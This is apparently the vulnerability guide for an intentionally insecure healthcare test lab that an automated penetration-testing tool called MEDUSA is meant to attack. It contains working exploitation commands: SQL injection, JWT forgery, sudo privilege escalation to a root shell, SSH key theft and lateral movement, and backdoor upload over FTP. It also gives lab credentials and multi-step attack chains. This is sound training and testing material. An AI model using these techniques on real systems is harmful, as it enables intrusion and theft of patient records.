# MEDUSA Lab - Vulnerability Documentation

## ⚠️ Security Warning

This environment contains **INTENTIONAL SECURITY VULNERABILITIES** for educational and testing purposes. 

**DO NOT:**
- Expose any of these services to the internet
- Use in production environments
- Use real patient data
- Run on production networks
- Share credentials outside testing environment

**DO:**
- Use only in isolated testing environments
- Reset environment after each testing session
- Document all testing activities
- Follow responsible disclosure practices

---

## Vulnerability Matrix

| Service | Vulnerability Type | Severity | CVSS | Exploitation Difficulty |
|---------|-------------------|----------|------|------------------------|
| EHR Web Portal | SQL Injection | Critical | 9.8 | Easy |
| EHR Web Portal | Cross-Site Scripting (XSS) | High | 7.4 | Easy |
| EHR Web Portal | IDOR | High | 8.1 | Easy |
| EHR API | Missing Authentication | Critical | 9.1 | Easy |
| EHR API | Information Disclosure | High | 7.5 | Easy |
| EHR API | Weak JWT Secret | High | 7.2 | Medium |
| MySQL Database | Weak Credentials | Critical | 9.8 | Easy |
| MySQL Database | Exposed Port | High | 7.5 | Easy |
| SSH Server | Weak Credentials | Critical | 9.8 | Easy |
| SSH Server | Sudo Misconfiguration | High | 8.4 | Medium |
| SSH Server | Exposed Private Keys | Critical | 9.6 | Easy |
| FTP Server | Anonymous Access | High | 8.2 | Easy |
| FTP Server | Unencrypted Protocol | Medium | 6.5 | Easy |
| LDAP | Anonymous Bind | High | 7.8 | Easy |
| LDAP | Unencrypted Connection | Medium | 6.4 | Easy |
| Workstation | SMB Misconfiguration | High | 8.0 | Medium |
| Workstation | Cached Credentials | High | 7.9 | Medium |

---

## Detailed Vulnerability Descriptions

### 1. EHR Web Portal (`ehr-webapp`)

#### 1.1 SQL Injection (Critical)
**Location:** `index.php`, `search.php`, `dashboard.php`

**Description:** User input is directly concatenated into SQL queries without sanitization or prepared statements.

**Vulnerable Code:**
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Exploitation:**
```bash
# Bypass authentication
curl -X POST http://localhost:8080/index.php \
  -d "username=admin' OR '1'='1' --" \
  -d "password=anything"

# Extract data
curl "http://localhost:8080/search.php?search=' UNION SELECT id,username,password,email,role,NULL FROM users --"
```

**MEDUSA Test Cases:**
- Authenticate bypass via SQLi
- Extract user credentials from database
- Enumerate database schema
- Modify data via UPDATE/INSERT injection

**Impact:** Complete database compromise, authentication bypass, data exfiltration

---

#### 1.2 Cross-Site Scripting (XSS)
**Location:** `dashboard.php` (medical notes field)

**Description:** Patient medical notes are rendered without sanitization, allowing JavaScript injection.

**Exploitation:**
```sql
-- Via SQL injection, insert XSS payload
UPDATE patients SET medical_notes = '<script>alert(document.cookie)</script>' WHERE id = 1;
```

**MEDUSA Test Cases:**
- Inject JavaScript to steal session cookies
- Create persistent XSS in medical records
- Exfiltrate data via XMLHttpRequest

**Impact:** Session hijacking, credential theft, malware distribution

---

#### 1.3 Insecure Direct Object Reference (IDOR)
**Location:** `dashboard.php?patient_id=X`

**Description:** No authorization check before displaying patient records.

**Exploitation:**
```bash
# Access any patient record without authorization
for i in {1..100}; do
  curl "http://localhost:8080/dashboard.php?patient_id=$i"
done
```

**MEDUSA Test Cases:**
- Enumerate all patient records
- Access records without authentication
- Modify patient data via parameter manipulation

**Impact:** Unauthorized access to all patient records (PHI breach)

---

### 2. EHR API (`ehr-api`)

#### 2.1 Missing Authentication
**Location:** Multiple endpoints

**Vulnerable Endpoints:**
- `GET /api/patients` - List all patients
- `GET /api/users` - List all users
- `GET /api/admin/schema` - Database schema
- `GET /api/admin/config` - Configuration details
- `POST /api/debug/query` - Execute arbitrary SQL

**Exploitation:**
```bash
# List all patients without authentication
curl http://localhost:3000/api/patients

# Dump database schema
curl http://localhost:3000/api/admin/schema

# Extract credentials
curl http://localhost:3000/api/admin/config
```

**MEDUSA Test Cases:**
- Access all endpoints without authentication
- Extract database configuration
- Execute arbitrary SQL via debug endpoint

**Impact:** Complete API compromise, data breach

---

#### 2.2 Verbose Error Messages
**Location:** All error handlers in `server.js`

**Description:** API returns stack traces and sensitive system information in error responses.

**Exploitation:**
```bash
# Trigger errors to get system info
curl "http://localhost:3000/api/patients/INVALID"
```

**MEDUSA Test Cases:**
- Map filesystem structure via error messages
- Identify software versions
- Discover internal endpoints

**Impact:** Information disclosure aiding further attacks

---

#### 2.3 Weak JWT Secret
**Location:** `JWT_SECRET = 'supersecret123'`

**Description:** JWT tokens use a weak, predictable secret key.

**Exploitation:**
```python
import jwt

# Forge valid JWT token
payload = {"id": 1, "username": "admin", "role": "admin"}
token = jwt.encode(payload, "supersecret123", algorithm="HS256")
print(token)
```

**MEDUSA Test Cases:**
- Crack JWT secret via dictionary attack
- Forge admin tokens
- Escalate privileges

**Impact:** Authentication bypass, privilege escalation

---

### 3. MySQL Database (`ehr-database`)

#### 3.1 Weak Root Password
**Credentials:**
- Root: `admin123`
- ehrapp: `Welcome123!`

**Exploitation:**
```bash
mysql -h localhost -P 3306 -u root -padmin123 healthcare_db
```

**MEDUSA Test Cases:**
- Brute force database credentials
- Direct database access from external network
- Extract all patient data
- Modify database contents

**Impact:** Complete database compromise

---

#### 3.2 Exposed MySQL Port
**Description:** MySQL port 3306 is exposed to the host network

**Exploitation:**
```bash
# Remote connection from any network location
mysql -h <target-ip> -P 3306 -u root -padmin123
```

**MEDUSA Test Cases:**
- Network scanning to discover MySQL
- Remote connection attempts
- Brute force attack from remote location

**Impact:** Remote database access, data breach

---

### 4. SSH Server (`ssh-server`)

#### 4.1 Weak Credentials
**Users and Passwords:**
- root: `password123`
- admin: `admin2024`
- doctor: `Doctor2024!`
- nurse: `Nurse123`

**Exploitation:**
```bash
ssh admin@localhost -p 2222
# Password: admin2024
```

**MEDUSA Test Cases:**
- Brute force SSH credentials
- Password spraying attacks
- Credential stuffing from breached databases

**Impact:** Remote system access

---

#### 4.2 Sudo Misconfiguration
**Location:** `/etc/sudoers`

**Vulnerable Configuration:**
```
admin ALL=(ALL) NOPASSWD: /usr/bin/vim, /usr/bin/find, /usr/bin/python3
```

**Exploitation:**
```bash
# Privilege escalation via vim
sudo vim -c ':!/bin/bash'

# Or via find
sudo find /etc -exec /bin/bash \;

# Or via python
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**MEDUSA Test Cases:**
- Enumerate sudo privileges (`sudo -l`)
- GTFOBins exploitation
- Privilege escalation to root

**Impact:** Root access, complete system compromise

---

#### 4.3 Exposed Private Keys
**Location:** `/root/.ssh/id_rsa` (world-readable)

**Exploitation:**
```bash
# Copy the private key
scp -P 2222 admin@localhost:/root/.ssh/id_rsa ./stolen_key
chmod 600 stolen_key

# Use it to access other systems
ssh -i stolen_key root@other-system
```

**MEDUSA Test Cases:**
- Locate and extract SSH keys
- Use keys for lateral movement
- Decrypt keys if encrypted

**Impact:** Lateral movement to other systems

---

#### 4.4 Sensitive Files
**Location:** `/opt/config/app.conf` (world-readable)

**Contents:**
```
DB_HOST=ehr-database
DB_USER=ehrapp
DB_PASS=Welcome123!
API_KEY=sk_live_51Habcdefg...
```

**MEDUSA Test Cases:**
- Find configuration files
- Extract credentials
- Use credentials for lateral movement

**Impact:** Credential disclosure, lateral movement

---

### 5. FTP Server (`file-server`)

#### 5.1 Anonymous FTP Access
**Description:** Anonymous FTP is enabled with read/write access

**Exploitation:**
```bash
ftp localhost 21
# Username: anonymous
# Password: (press enter)

# List files
ls

# Download files
get medical_records/patients.csv

# Upload backdoor
put backdoor.php
```

**MEDUSA Test Cases:**
- Connect anonymously
- Enumerate directory structure
- Download sensitive files
- Upload malicious files

**Impact:** Data exfiltration, malware upload

---

#### 5.2 Weak User Credentials
**Credentials:**
- ftpuser: `ftp123`
- fileadmin: `Files2024!`

**MEDUSA Test Cases:**
- Brute force FTP credentials
- Access user-specific directories

**Impact:** Unauthorized file access

---

### 6. LDAP Server (`ldap-server`)

#### 6.1 Anonymous Bind
**Description:** LDAP allows anonymous binding and enumeration

**Exploitation:**
```bash
# Enumerate users without authentication
ldapsearch -x -H ldap://localhost:389 -b "dc=medcare,dc=local" "(objectClass=person)"
```

**MEDUSA Test Cases:**
- Anonymous LDAP queries
- User enumeration
- Extract user attributes (email, phone, etc.)

**Impact:** User enumeration, organizational structure disclosure

---

#### 6.2 Weak Admin Password
**Credentials:**
- Admin DN: `cn=admin,dc=medcare,dc=local`
- Password: `admin123`

**MEDUSA Test Cases:**
- Brute force LDAP admin password
- Modify LDAP entries
- Create new users

**Impact:** Directory compromise, account creation

---

### 7. Workstation (`workstation`)

#### 7.1 SMB Misconfiguration
**Description:** SMB shares with guest access and weak permissions

**Exploitation:**
```bash
# List shares
smbclient -L //localhost -N

# Access shared folder without credentials
smbclient //localhost/Shared -N

# Access with credentials
smbclient //localhost/Documents -U doctor
# Password: Doctor2024!
```

**MEDUSA Test Cases:**
- Enumerate SMB shares
- Access guest shares
- Download sensitive documents
- Upload malicious files

**Impact:** File access, malware distribution

---

#### 7.2 Cached Credentials
**Location:** `/home/doctor/Documents/connection.ini`

**Contents:**
```ini
[Database Connection]
server=ehr-database
username=ehrapp
password=Welcome123!

[FTP Server]
host=file-server
username=fileadmin
password=Files2024!
```

**MEDUSA Test Cases:**
- Search for configuration files
- Extract cached credentials
- Use credentials for lateral movement

**Impact:** Lateral movement, privilege escalation

---

## Testing Methodology for MEDUSA

### Phase 1: Reconnaissance
1. **Network Scanning**
   - Port scanning (Nmap)
   - Service fingerprinting
   - Banner grabbing

2. **Web Application Mapping**
   - Directory enumeration
   - Endpoint discovery
   - Parameter fuzzing

3. **User Enumeration**
   - LDAP queries
   - API user endpoints
   - SSH user validation
   - SMB share enumeration

### Phase 2: Initial Access
1. **Credential Attacks**
   - Password brute forcing
   - Default credential testing
   - Credential stuffing

2. **Web Exploitation**
   - SQL injection
   - Authentication bypass
   - File upload vulnerabilities

3. **Service Exploitation**
   - Anonymous FTP access
   - LDAP anonymous bind
   - Unauthenticated API access

### Phase 3: Lateral Movement
1. **Credential Reuse**
   - Test extracted credentials across all services
   - SSH key reuse

2. **Network Pivoting**
   - Access internal services
   - SMB enumeration
   - Database connections

### Phase 4: Privilege Escalation
1. **Linux Privilege Escalation**
   - Sudo misconfiguration
   - SUID binaries
   - Writable scripts

2. **Application Privilege Escalation**
   - JWT token forgery
   - SQL injection to admin
   - API privilege escalation

### Phase 5: Data Exfiltration
1. **Database Dumping**
   - Patient records
   - User credentials
   - Medical records

2. **File Exfiltration**
   - FTP downloads
   - SMB file access
   - Configuration files

### Phase 6: Persistence
1. **Backdoor Creation**
   - Web shells via file upload
   - SSH key injection
   - Cron jobs
   - Database triggers

---

## Exploitation Chains (Attack Paths)

### Chain 1: Web → Database → Lateral Movement
```
1. SQL Injection on web portal
   ↓
2. Extract database credentials
   ↓
3. Direct MySQL connection
   ↓
4. Dump all patient data
   ↓
5. Find SSH credentials in config
   ↓
6. SSH access to internal systems
```

### Chain 2: API → Privilege Escalation → Persistence
```
1. Unauthenticated API access
   ↓
2. Extract JWT secret from /api/admin/config
   ↓
3. Forge admin JWT token
   ↓
4. Access privileged API endpoints
   ↓
5. Execute arbitrary SQL via /api/debug/query
   ↓
6. Create backdoor user account
```

### Chain 3: Anonymous Services → Credential Harvesting → Compromise
```
1. Anonymous FTP access
   ↓
2. Download backup files containing credentials
   ↓
3. Use credentials for SSH access
   ↓
4. Sudo privilege escalation
   ↓
5. Root access on SSH server
   ↓
6. Pivot to other containers via shared network
```

### Chain 4: LDAP → User Enumeration → Brute Force
```
1. Anonymous LDAP bind
   ↓
2. Enumerate all usernames
   ↓
3. Password spraying attack on SSH
   ↓
4. Successful login with weak credentials
   ↓
5. Find cached credentials in home directory
   ↓
6. Lateral movement to database and FTP
```

---

## Mitigation Guidance (For Testing Validation)

After exploitation, MEDUSA should validate if mitigations would be effective:

### Web Application
- ✅ Use prepared statements (parameterized queries)
- ✅ Implement output encoding for XSS prevention
- ✅ Add authorization checks for all resources
- ✅ Implement CSRF tokens
- ✅ Use secure session management

### API Security
- ✅ Implement authentication on all endpoints
- ✅ Use strong JWT secrets (random, 256-bit)
- ✅ Implement rate limiting
- ✅ Disable verbose error messages in production
- ✅ Use API keys with proper scope restrictions

### Database Security
- ✅ Use strong passwords (16+ characters, random)
- ✅ Don't expose database ports externally
- ✅ Implement principle of least privilege
- ✅ Enable audit logging
- ✅ Encrypt sensitive data at rest

### SSH Security
- ✅ Enforce key-based authentication only
- ✅ Disable root login
- ✅ Use fail2ban for brute force protection
- ✅ Properly configure sudo (no NOPASSWD for dangerous commands)
- ✅ Secure private key permissions (600)

### FTP/File Services
- ✅ Disable anonymous access
- ✅ Use SFTP instead of FTP
- ✅ Implement access controls
- ✅ Enable logging and monitoring

### General Security
- ✅ Network segmentation with firewalls
- ✅ Regular security updates
- ✅ Centralized logging and monitoring
- ✅ Incident response procedures
- ✅ Regular security assessments

---

## MEDUSA Success Metrics

Track MEDUSA's effectiveness with these metrics:

1. **Discovery Rate**: % of services/vulnerabilities discovered
2. **Exploitation Success**: % of vulnerabilities successfully exploited
3. **Time to Compromise**: Time from start to first successful access
4. **Lateral Movement**: Number of systems accessed from initial foothold
5. **Data Exfiltration**: Amount and sensitivity of data extracted
6. **Persistence**: Ability to maintain access after detection
7. **Automation Level**: % of exploitation performed autonomously

---

## Logging and Monitoring

All activities should be logged for analysis:

- **Web Server**: Apache access/error logs in `ehr-logs` volume
- **API Server**: Application logs in `api-logs` volume
- **Database**: Query logs in `db-logs` volume
- **SSH**: Auth logs in `ssh-logs` volume
- **FTP**: Transfer logs in `ftp-logs` volume
- **Centralized**: All logs forwarded to `log-collector` at port 514

View consolidated logs at: http://localhost:8081

---

## Compliance Implications

These vulnerabilities would violate:

- **HIPAA** (Health Insurance Portability and Accountability Act)
  - Unauthorized PHI access
  - Lack of encryption
  - Insufficient access controls
  
- **GDPR** (General Data Protection Regulation)
  - Inadequate data protection
  - No breach notification capability
  
- **PCI DSS** (if payment data involved)
  - Weak passwords
  - Unencrypted data transmission
  
- **HITECH Act**
  - Electronic health record vulnerabilities
  - Lack of audit trails

---

## Legal and Ethical Considerations

**Important:** This lab environment is for authorized testing only.

- Only test systems you own or have explicit permission to test
- Do not use techniques learned here on production systems
- Follow responsible disclosure for any real vulnerabilities found
- Comply with Computer Fraud and Abuse Act (CFAA) and equivalent laws
- Maintain ethical standards in all security research

---

## References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE Top 25: https://cwe.mitre.org/top25/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- HIPAA Security Rule: https://www.hhs.gov/hipaa/for-professionals/security/
- GTFOBins (Privilege Escalation): https://gtfobins.github.io/

---

**Document Version:** 1.0  
**Last Updated:** 2024-01-30  
**Maintained By:** MEDUSA Security Research Team

